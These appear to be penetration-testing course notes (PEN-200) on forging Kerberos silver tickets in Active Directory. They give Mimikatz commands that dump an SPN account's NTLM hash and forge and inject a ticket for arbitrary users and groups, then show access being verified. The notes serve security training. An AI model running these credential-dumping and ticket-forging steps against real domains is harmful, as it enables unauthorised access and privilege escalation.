# 23.2.4 — Silver Tickets

- Module: PEN-200 · 23. Attacking Active Directory Authentication
- Source: portal.offsec.com · module `attacking-active-directory-authentication-46102` (§23.2.4)
- Code blocks: 5

> With a **service account's password hash** you can **forge a service ticket (silver ticket)** for
> its SPN with any user/groups you like — most apps trust the ticket's PAC without validating it
> against the DC. Output omitted.

## Three ingredients needed

1. **SPN account password hash** (RC4/NTLM)
2. **Domain SID** (without the user RID)
3. **Target SPN**

## Confirm no access first

```powershell
iwr -UseDefaultCredentials http://{{COMPUTER_NAME}}      # 401 Unauthorized as current user
```

## 1) Get the SPN account NTLM hash (Mimikatz, as local admin where it has a session)

```
privilege::debug
sekurlsa::logonpasswords      # copy the NTLM of the SPN account (e.g. iis_service)
```

## 2) Get the domain SID (drop the trailing -RID)

```powershell
whoami /user
```

## 3) Forge + inject the silver ticket

```
kerberos::golden /sid:{{SID}} /domain:{{DOMAIN}} /ptt /target:{{COMPUTER_NAME}}.{{DOMAIN}} /service:http /rc4:{{NTLM_HASH}} /user:{{TARGET_USER}}
```

> `/ptt` injects it into the current session; `/user:` can be **any** name (even non-existent
> pre-patch) with groups set to Domain Admins (512) etc. `kerberos::golden` builds both silver and
> golden tickets.

## Verify and use

```powershell
klist                                            # confirm the forged ticket is cached
iwr -UseDefaultCredentials http://{{COMPUTER_NAME}}   # now 200 OK, as the forged user
```

> **Patch note:** the **PAC_REQUESTOR** update (enforced 11 Oct 2022) makes the DC validate the
> user exists in-domain, blocking silver tickets for **non-existent** users. Golden tickets are
> covered in the Lateral Movement module.
